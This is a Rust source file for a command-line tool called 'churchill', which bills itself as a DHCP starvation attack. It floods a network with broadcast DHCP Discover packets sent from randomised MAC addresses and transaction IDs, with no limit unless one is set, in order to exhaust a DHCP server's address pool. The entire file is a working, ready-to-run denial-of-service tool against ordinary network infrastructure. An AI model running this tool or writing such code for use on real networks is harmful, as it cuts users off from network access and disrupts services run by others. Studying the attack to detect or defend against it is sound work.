use clap::Parser;
use ctrlc;
use dhcp4r::options::{DhcpOption, MessageType as DhcpMessageType};
use dhcp4r::packet::Packet;
use getifaddrs::{Interface, getifaddrs};
use rand::Rng;
use std::io::{self, Write};
use std::net::{Ipv4Addr, UdpSocket,SocketAddr};
use std::str::FromStr;
use std::time::Duration;
use socket2::{Socket,Domain,Type,Protocol};

// Information displayed in the CLI help menu
#[derive(Parser, Debug)]
#[command(
    name = "churchill",
    version = "1.0.0",
    about = "A DHCP server's worst nightmare (DHCP Starvation attack)"
)]
struct Cli {
    /// Number of packets to send (0 = unlimited)
    #[arg(short, long, default_value_t = 0)]
    number: i32,
    /// Delay between packets in milliseconds (defaults to instantaneous)
    #[arg(short, long, default_value_t = 0)]
    delay: i32,
    /// Address to send DHCP packets on (if a valid address isn't specified, a list of interfaces/addresses will be shown)
    #[arg(short,long,default_value_t = String::from("0.0.0.0"))]
    address: String,
    /// List available network interfaces/addresses
    #[arg(short,long, action = clap::ArgAction::SetTrue)]
    list: bool,
}

fn main() {
    // Controls behavior when the user sends an interrupt command (CTRL + C)
    ctrlc::set_handler(move || {
        print!("\n[!] Stopped by user.");
        std::process::exit(0);
    })
    .expect("[!] Failure setting CTRL+C handler.");

    // Checks if user has elevated privileges (needed to open a socket)
    if !is_elevated() {
        #[cfg(target_family = "windows")]
        println!(
            "[!] Not elevated. Try running this program in an administrator command prompt/powershell window."
        );
        #[cfg(target_family = "unix")]
        println!("[!] Not elevated. Try running 'sudo churchill'.");
        std::process::exit(0);
    }

    // Parses command-line arguments
    let cli = Cli::parse();

    // Lists available interfaces and exits
    if cli.list {
        get_ipv4_interfaces();
        std::process::exit(0);
    }

    // Gets address from CLI and checks if it's valid
    let mut addr = cli.address;
    if addr == "0.0.0.0" || !(addr.parse::<Ipv4Addr>().is_ok()) {
        println!("[!] Address invalid or not selected. Please select an interface:");

        let ipv4_interfaces = get_ipv4_interfaces();

        // Gets interface number from user input
        let mut selection = String::new();
        io::stdin()
            .read_line(&mut selection)
            .expect("[!] Failed to read line.");
        // Checks if input is a valid number
        let selection_num: usize = match selection.trim().parse() {
            Ok(num) => num,
            Err(_) => {
                println!("[!] Invalid input.");
                0
            }
        };
        // Checks if inputted number is in valid range
        if selection_num <= 0 || selection_num > ipv4_interfaces.len() {
            println!(
                "[!] Please enter a number between 1 and {}",
                ipv4_interfaces.len()
            );
            std::process::exit(0);
        }
        // Returns address from interface matching specified number
        addr = ipv4_interfaces[selection_num - 1].address.to_string();
    }

    // Creates a DHCP Discover packet with a transaction ID of 12345678 and a random MAC address
    let mut packet = Packet {
        broadcast: true,
        reply: false,
        hops: 0,
        xid: 0x12345678,
        secs: 0,
        ciaddr: std::net::Ipv4Addr::UNSPECIFIED,
        yiaddr: std::net::Ipv4Addr::UNSPECIFIED,
        siaddr: std::net::Ipv4Addr::UNSPECIFIED,
        giaddr: std::net::Ipv4Addr::UNSPECIFIED,
        chaddr: rand_mac(),
        options: vec![DhcpOption::DhcpMessageType(DhcpMessageType::Discover)],
    };
    // Creates buffer array for packet
    let mut buf = [0u8; 1500];
    let socket : UdpSocket;
    #[cfg(target_family="windows")] {
    // Creates UDP socket on specified interface
    socket = UdpSocket::bind(format!("{}:68", addr)).unwrap();
    }

    #[cfg(any(target_os="linux",target_os = "macos"))]
    {
        let addr = SocketAddr::from_str(format!("{}:68",addr).as_str()).unwrap();
        let socketRaw = Socket::new(Domain::IPV4,Type::DGRAM,Some(Protocol::UDP)).unwrap();
        socketRaw.set_reuse_address(true).unwrap();
        socketRaw.bind(&addr.into()).unwrap();
        socket = socketRaw.into();

    }

    socket.set_broadcast(true).ok();



    // Formatters for print statement below
    let number;
    if cli.number == 0 {
        number = String::from("Infinite");
    } else {
        number = cli.number.to_string()
    }

    let s;
    if cli.number == 1 {
        s = ""
    } else {
        s = "s"
    }

    println!(
        "[!] Sending {} DHCP Discover Packet{} on address {}",
        number, s, addr
    );

    // Counter for keeping track of packets sent
    let mut count = 0;
    // The cli.number == 0 is for infinite packets
    while count < cli.number || cli.number == 0 {
        // Randomizes source MAC address and DHCP transaction ID
        packet.chaddr = rand_mac();
        packet.xid = rand_u32();

        // Encodes packet and sends it out on a DHCP port (67)
        let encoded = packet.encode(&mut buf);
        socket
            .send_to(encoded, "255.255.255.255:67")
            .expect("[!] Error sending packet out of socket");
        count += 1;
        print!(
            "{} [{}/{}]\r",
            progress_bar((count, cli.number)),
            count,
            cli.number
        );
        // Ensures output is shown, because apparently print!() doesn't do that on its own??
        io::stdout().flush().expect("[!] Error flushing output");
        if cli.delay > 0 {
            std::thread::sleep(Duration::from_millis(cli.delay as u64));
        }
    }
    print!("\n");
}

fn rand_mac() -> [u8; 6] {
    let mut rng = rand::rng();
    // Creates buffer for MAC address
    let mut mac = [0u8; 6];
    // Fills buffer with random values
    rng.fill(&mut mac);
    // Ensures that the MAC address is unicast
    mac[0] &= 0b11111110;
    // There's probably a better way to do this
    return mac;
}

fn rand_u32() -> u32 {
    let mut rng = rand::rng();
    let u: u32 = rng.random();
    return u;
}

fn get_ipv4_interfaces() -> Vec<Interface> {
    // Gets a list of all interfaces
    let interfaces: Vec<_> = getifaddrs().unwrap().collect();

    // Creates new array that stores only the interfaces tied to IPv4 addresses
    let mut ipv4_interfaces: Vec<Interface> = Vec::new();
    for iface in &interfaces {
        if iface.address.is_ipv4() {
            ipv4_interfaces.push(iface.clone());
        }
    }

    for (i, iface) in ipv4_interfaces.iter().enumerate() {
        // Interface descriptions are human-readable names on windows
        // And interface names look smth like \Device_{AF32-BC24-EE15-FE16-CA14-CB59}
        // so we can't use those
        #[cfg(target_family = "windows")]
        println!("[{}] {} : {}", i + 1, iface.description, iface.address);
        // Interface descriptions... don't seem to exist on MacOS/Linux?
        // So we use the interface name
        #[cfg(target_family = "unix")]
        println!("[{}] {} : {}", i + 1, iface.name, iface.address);
    }
    ipv4_interfaces
}

// Returns a progress bar like [###>.......]
fn progress_bar((count, total): (i32, i32)) -> String {
    if total == 0 {
        return "[..........]".to_string();
    }
    let filled = (count * 10 / total) as usize;
    let empty = 10 - filled;
    format!("[{}>{}]", "#".repeat(filled), ".".repeat(empty))
}

#[cfg(target_family = "unix")]
fn is_elevated() -> bool {
    unsafe { libc::geteuid() == 0 }
}

#[cfg(target_family = "windows")]
fn is_elevated() -> bool {
    // If the user can open a "net session", they are probably elevated
    // Windows is weird
    use std::process::Command;
    Command::new("net")
        .arg("session")
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}
